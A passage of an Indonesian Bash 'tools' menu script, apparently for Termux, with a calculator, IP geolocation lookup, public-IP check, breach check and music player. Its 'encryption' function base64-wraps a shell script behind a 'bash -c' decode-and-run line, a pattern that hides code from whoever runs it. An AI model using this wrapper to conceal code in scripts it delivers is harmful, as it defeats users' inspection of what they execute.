⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠊⠉⠉⠛⢻⠾⠯⢽⣯⣿⣽⣳⢶⣦⣬⣅⣐⣂⡀⠀⠠⠐⣀⣾⣿⠇⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠉⠩⠟⠛⠛⠾⢷⣯⣿⣝⣿⣟⣿⣛⡷⢋⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠒⠈⠉⠉⠉⠁⠐⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" | lolcat
     echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}${BOLD}ALL KALKULATOR${CYAN}             │
  ╰────────────────────────────────────────╯${NC}"
    echo "1. Penjumlahan"
    echo "2. Pengurangan"
    echo "3. Perkalian"
    echo "4. Pembagian"
    echo "5. Pangkat"
    echo "6. Akar Kuadrat"
    echo "7. Persen"
    echo "8. Ekspresi Bebas (pakai + - * / ^ dst)"
    echo "0. Keluar"
    echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}${BOLD}ALL KALKULATOR${CYAN}             │
  ╰────────────────────────────────────────╯${NC}"
    read -p "PILIH MENU KALKULATOR [0-8]: " pilih

    case $pilih in
      1)
        read -p "Masukkan angka pertama: " a
        read -p "Masukkan angka kedua: " b
        echo "Hasil: $((a + b))"
        ;;
      2)
        read -p "Masukkan angka pertama: " a
        read -p "Masukkan angka kedua: " b
        echo "Hasil: $((a - b))"
        ;;
      3)
        read -p "Masukkan angka pertama: " a
        read -p "Masukkan angka kedua: " b
        echo "Hasil: $((a * b))"
        ;;
      4)
        read -p "Masukkan angka pertama: " a
        read -p "Masukkan angka kedua: " b
        echo "Hasil: $((a / b))"
        ;;
      5)
        read -p "Masukkan angka: " a
        read -p "Dipangkatkan berapa: " b
        echo "Hasil: $(echo "$a ^ $b" | bc)"
        ;;
      6)
        read -p "Masukkan angka: " a
        echo "Hasil akar kuadrat: $(echo "scale=4; sqrt($a)" | bc)"
        ;;
      7)
        read -p "Masukkan nilai (misal: 30): " a
        read -p "Persen berapa (misal: 15): " b
        echo "$b% dari $a adalah: $(echo "scale=2; $a * $b / 100" | bc)"
        ;;
      8)
        read -p "Masukkan ekspresi matematika (contoh: 5+3*2^2): " ekspresi
        hasil=$(echo "scale=4; $ekspresi" | sed 's/\^/**/g' | bc -l 2>/dev/null)
        echo "Hasil: $hasil"
        ;;
      0)
        echo "Keluar dari kalkulator."
        break
        ;;
      *)
        echo "Pilihan tidak valid!"
        salah
        ;;
    esac

    echo ""
    read -p "Tekan ENTER untuk kembali ke menu..."
  done
}
lapor_error() {
clear
loading
clear
  echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}LAPOR ERROR${CYAN}            │
  ╰────────────────────────────────────────╯${NC}" | lolcat
  xdg-open "$LAPOR_TOOLS_ERROR" &
}



ip_lookup() {
  clear
  echo -e "
 ██▓ ██▓███     ▄▄▄█████▓ ██▀███   ▄▄▄       ▄████▄   ██ ▄█▀
▓██▒▓██░  ██▒   ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ 
▒██▒▓██░ ██▓▒   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ 
░██░▒██▄█▓▒ ▒   ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ 
░██░▒██▒ ░  ░     ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄
░▓  ▒▓▒░ ░  ░     ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒
 ▒ ░░▒ ░            ░      ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░
 ▒ ░░░            ░        ░░   ░   ░   ▒   ░        ░ ░░ ░ 
 ░                          ░           ░  ░░ ░      ░  ░   
                                            ░               " | lolcat
     
     echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}${BOLD}IP LOOKUP TOOLS${CYAN}            │
  ╰────────────────────────────────────────╯${NC}"
  read -p "Masukkan IP target: " ip

  if [[ -z "$ip" ]]; then
    echo "IP tidak boleh kosong!"
    return
  fi

  echo "Melacak data..."
  loading
  sleep 1

  curl -s "http://ip-api.com/json/$ip" | jq -r '
    if .status == "success" then
      "Negara: \(.country)\n Provinsi: \(.regionName)\nKota: \(.city)\nISP: \(.isp)\n Latitude: \(.lat)\nLongitude: \(.lon)\nZona Waktu: \(.timezone)\nMaps: https://www.google.com/maps?q=\(.lat),\(.lon)"
    else
      "Gagal mengambil data. Cek kembali IP-nya!"
    end
  '
}

cek_ip_publik() {
  clear
  loading
  echo -e "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⢤⣶⣯⣿⣶⣿⣷⣶⣿⣭⣶⣄⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣔⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣕⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⣢⢄⡀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣯⣴⡦⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠈⠉⠛⠛⢿⠿⣿⣿⣿⠿⠟⠃⠁⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠉⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣟⣯⣷⡿⠋⠀⠀⠀⢀⠀⠀⢀⠀⠀⠘⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣻⣾⡿⠞⢻⣾⣿⠀⠀⠀⠀⠙⠲⠶⠛⠀⠀⠀⠈⢢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⢸⣷⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣿⣿⣿⣿⣿⣿⡿⣽⣷⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⡄⠀⠀⠀⠀⠀⠀⠀
⠀⢀⢾⣿⣿⣿⣿⡿⣯⢿⣽⣻⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠉⠉⣠⣷⣿⣿⣿⣿⣾⡽⣯⣟⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣾⣾⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣷⣕⢄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣰⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣸⣿⣿⣶⣃⠀⣀⠀⠀⠀⣀⠀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠏⢹⣿⣾⣳⣿⡿⣾⢿⡿⣮⠃
⠀⠉⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⡀⠀⠀⠀⠀⠀⣸⠄⢸⣿⣳⣿⣿⡿⣽⢯⣟⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠻⢟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢇⠀⠐⠒⠊⠉⠀⣾⣷⣻⣟⣻⣿⢯⡿⣽⣞⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣂⠀⠀⠀⠀⠀⠹⣷⣯⣿⣻⡽⣯⣟⣷⣿⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣏⡆⠀⠀⠀⠀⠀⠉⠻⠟⠿⢿⣿⡿⠻⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⢿⣿⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣏⡿⢗⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" | lolcat  
echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}${BOLD}IP IP PUBLIK${CYAN}                  │
  ╰────────────────────────────────────────╯${NC}"
  ip=$(curl -s ifconfig.me)
  echo "IP Publik kamu: $ip"
}

cek_kebocoran_gmail() {
  clear
  echo -e "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⢤⣶⣯⣿⣶⣿⣷⣶⣿⣭⣶⣄⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣔⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣔⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣕⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⣢⢄⡀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣯⣴⡦⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠈⠉⠛⠛⢿⠿⣿⣿⣿⠿⠟⠃⠁⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠉⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣟⣯⣷⡿⠋⠀⠀⠀⢀⠀⠀⢀⠀⠀⠘⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣻⣾⡿⠞⢻⣾⣿⠀⠀⠀⠀⠙⠲⠶⠛⠀⠀⠀⠈⢢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⢸⣷⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣿⣿⣿⣿⣿⣿⡿⣽⣷⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⡄⠀⠀⠀⠀⠀⠀⠀
⠀⢀⢾⣿⣿⣿⣿⡿⣯⢿⣽⣻⣦⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠉⠉⣠⣷⣿⣿⣿⣿⣾⡽⣯⣟⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣾⣾⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣷⣕⢄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣰⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣸⣿⣿⣶⣃⠀⣀⠀⠀⠀⣀⠀
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠏⢹⣿⣾⣳⣿⡿⣾⢿⡿⣮⠃
⠀⠉⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⡀⠀⠀⠀⠀⠀⣸⠄⢸⣿⣳⣿⣿⡿⣽⢯⣟⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠻⢟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢇⠀⠐⠒⠊⠉⠀⣾⣷⣻⣟⣻⣿⢯⡿⣽⣞⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣂⠀⠀⠀⠀⠀⠹⣷⣯⣿⣻⡽⣯⣟⣷⣿⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣏⡆⠀⠀⠀⠀⠀⠉⠻⠟⠿⢿⣿⡿⠻⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⢿⣿⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣏⡿⢗⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀" | lolcat
echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │        ${YELLOW}${BOLD}CEK KEBOCORAN GMAIL${CYAN}           │
  ╰────────────────────────────────────────╯${NC}" 
  
  echo ""
  read -p "EMASUKAN GMAIL YNG MAU DI CEK: " gmail

  if [[ ! "$gmail" =~ ^[a-zA-Z0-9._%+-]+@gmail\.com$ ]]; then
    echo -e "${RED}Format Gmail tidak valid!${NC}"
    return
  fi

  echo -e "\nMengecek kebocoran untuk: $gmail ..."
  
  sleep 1

  hasil=$(curl -s "https://haveibeenpwned.com/unifiedsearch/$gmail" -H "User-Agent: Bash-Tools" | grep -o 'Name\":\"[^\"]*')

  if [[ -z "$hasil" ]]; then
    echo -e "${GREEN}✅ Aman! Tidak ditemukan di database kebocoran publik.${NC}"
  else
    echo -e "${RED}TERDETEKSI! Email ini pernah terlibat kebocoran:${NC}"
    echo "$hasil" | sed 's/Name\":\"/  - /g'
  fi
}

enkripsi_bash() {
clear
  echo -e "
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠇⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣴⣿⠏⠀⢰⣿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠻⣿⣆⠀⠙⣿⣦⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣴⣾⡿⠃⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣆⠀⠘⢿⣷⣦⣀⠀⠀⠀⠀
⢠⣶⣿⡿⠿⠛⠁⠀⣠⣾⡿⠃⠀⠀⠀⠀⠀⣴⣾⡿⠿⠟⠻⠿⢿⣷⣦⡀⠀⠀⠀⠀⠘⢿⣷⣄⠀⠈⠛⠿⢿⣿⣶⣄
⢸⣿⠀⠀⣀⣤⣶⣿⠟⠋⠀⠀⠀⠀⢀⣀⠀⠈⢁⣤⣶⣶⣶⣶⣤⡀⠙⢿⣦⡀⠀⠀⠀⠀⠙⠻⣿⣶⣤⣀⠀⠀⣿⡟
⢸⣿⠀⠀⣿⡟⠉⠀⠀⠀⠀⠀⠀⠀⣿⡟⠀⣴⣿⠟⠉⠀⠀⠉⠛⣿⣧⠀⢻⣿⠀⠀⠀⠀⠀⠀⠀⠉⢻⣿⠀⠀⣿⡇
⢸⣿⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⢸⣿⠃⠀⠀⠀⠀⠀⠀⠈⣿⡇⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⣿⡇
⢸⣿⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⣿⡇
⢸⣿⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣀⣸⣿⣀⣀⣀⣀⣀⣀⣀⣀⣿⣇⣀⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⣿⡇
⢸⣿⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⣰⣾⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠿⣷⣦⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⣿⡇
⢸⣿⠀⠀⣿⡇⠀⠀⠀⠀⠀⢰⣿⠃⠀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡆⠀⠀⠀⠀⠀⢸⣿⠀⠀⣿⡇
⢸⣿⡄⠀⢻⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⢰⣿⠟⠻⣿⡆⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⡟⠀⢠⣿⡇
⠀⣿⣇⠀⠸⣿⡆⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⢸⣿⡄⢠⣿⡇⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⢰⣿⠇⠀⣸⣿⠁
⠀⢸⣿⡀⠀⢿⣿⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⢸⣿⡇⢸⣿⡇⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⣾⡿⠀⢀⣿⡏⠀
⠀⠈⣿⣧⠀⠘⣿⣧⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠻⠿⡿⠟⠁⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⣼⣿⠃⠀⣼⣿⠁⠀
⠀⠀⠘⣿⣧⠀⠘⣿⣧⠀⠀⠘⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠃⠀⠀⣼⣿⠃⠀⣼⣿⠃⠀⠀
⠀⠀⠀⠘⣿⣦⠀⠘⢿⣧⡀⠀⠈⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠟⠁⠀⠀⣼⡿⠃⠀⣴⣿⠃⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣧⡀⠈⠻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢈⠄⢀⣼⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣷⣄⠀⠙⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⡿⠃⠈⣠⣾⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⣷⣄⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⡿⠋⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣷⣄⠀⠈⠛⢿⣷⣤⣀⠀⠀⠀⠀⣀⣤⣾⡿⠟⠁⠀⣡⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣦⣀⠀⠈⠛⠿⢿⣷⣶⡿⠿⠛⠁⠀⣈⣴⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⢿⣶⣤⣀⡀⠀⠀⢀⣀⣤⣶⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⣷⣾⠿⠟⠛⠉⠀" | lolcat
echo -e "${BG_RED}${YELLOW} ENCRYPSI CODE BASH ${NC}"
  read -p "Masukkan path file .sh yang ingin di-obfuscate: " target

  # Cek apakah file ada
  if [ ! -f "$target" ]; then
    echo -e "${RED}File tidak ditemukan!${NC}"
    return 1
  fi

  # Encode isi file ke base64
  base64code=$(base64 "$target")

  # Buat nama file output
  output="${target%.sh}_obf.sh"

  # Simpan hasil obfuscate ke file baru
  echo "#!/bin/bash" > "$output"
  echo "bash -c \"\$(echo '$base64code' | base64 -d)\"" >> "$output"
  chmod +x "$output"

  echo -e "${GREEN}Berhasil meng-obfuscate file! Hasil disimpan di: $output${NC}"
}

play_music() {
    clear
    # auto-install mpv jika belum ada
    if ! command -v mpv &>/dev/null; then
        echo -e "${RED}[+] Installing mpv...${NC}"
        echo -e "${GREEN} SABAR PROSES 1-2 MENIT ${NC}"
        pkg install -y mpv >/dev/null 2>&1
    fi

    # cek lagi setelah install
    if command -v mpv &>/dev/null; then
        mpv --no-video --loop-file "$LAGU_YOUTUBE" >/dev/null 2>&1 &
    else
        echo -e "${RED}mpv masih gagal di-install atau tidak ditemukan!${NC}"
    fi
}


stop_music() {
  pkill mpv
}

browse_web() {
  if ! command_exists w3m; then
    echo -e "${RED}w3m tidak ditemukan. Instal w3m untuk menggunakan fitur ini.${NC}"
    return 1
  fi

  read -p "Masukkan URL yang ingin dibuka: " url
  w3m "$url"
}

lacak_nama() {
clear
echo -e "
⠀⠀⠀⠀⠀⠀⣀⣤⡴⢶⣦⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣴⢶⡴⣤⢦⣤⡤⣤⢤⡤⣤⢤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⠶⣛⣽⣶⣿⣟⣛⣻⣋⣉⣉⠉⠉⠉⠉⠉⢙⣻⣛⣿⣿⣶⣷⣤⡛⡔⣣⢜⢢⣃⠶⣈⠛⡦⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣼⣿⣿⠿⠏⠉⠉⠉⠉⠉⠉⠉⠙⠟⠷⣤⣤⣤⣿⡽⠋⠀⠀⣤⡿⢿⠻⣿⣴⣉⠶⣌⠲⣉⠳⡜⠬⢦⠀⠀⠀⠀⠀⠀
⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣯⣿⡽⠏⠀⠀⣠⣾⢟⡀⠸⢧⡌⠹⣷⣞⢬⠣⣍⢲⡙⡮⢩⢧⠀⠀⠀⠀⠀
⠘⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣩⣿⣽⠿⠀⠀⢠⡿⠛⢁⠈⠿⣆⡀⠛⠇⣸⣿⣆⡛⣤⣳⣼⡿⠿⠿⠷⣶⣤⣤⣠
⠀⠀⠀⠀⠀⠀⢀⣤⡶⡶⠶⠶⠶⣶⢾⣷⣷⡞⠀⠀⢰⡾⠁⠀⠙⢷⡄⠘⢁⣤⣶⠋⢙⣿⡿⠻⠋⠁⠀⠀⠀⠀⢠⣴⣿⣿
⠀⠀⠀⠀⢀⣴⣾⣿⡷⠿⡉⠉⠉⠹⠿⣦⡹⢦⡀⠀⠈⠻⣦⡀⠀⢠⣤⡶⠞⡁⣠⡿⠟⠁⠀⠀⠀⠀⢠⣤⣶⣿⣿⣿⣿⢿
⠀⠀⠀⢀⡿⢿⡟⠡⣴⣶⣿⣿⣿⣷⣦⡄⢻⡆⢿⡄⠀⠀⠀⠛⠛⠋⠀⣤⡴⠛⠋⠀⠀⠀⠀⠀⢠⣴⣿⣿⣿⣿⣿⡿⠋⠀
⠀⠀⠀⢘⡇⣾⠁⣾⣿⣿⠙⣿⣿⣿⣿⣷⠂⢹⣞⡇⠀⠀⠀⣀⣴⡿⠟⠉⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⡿⠟⠀⠀⠀
⠀⠀⠀⢠⡧⣟⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡃⢸⡯⣧⣤⠶⠿⠛⠈⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣿⣿⣿⣿⡿⢿⡇⠀⠀⠀⠀
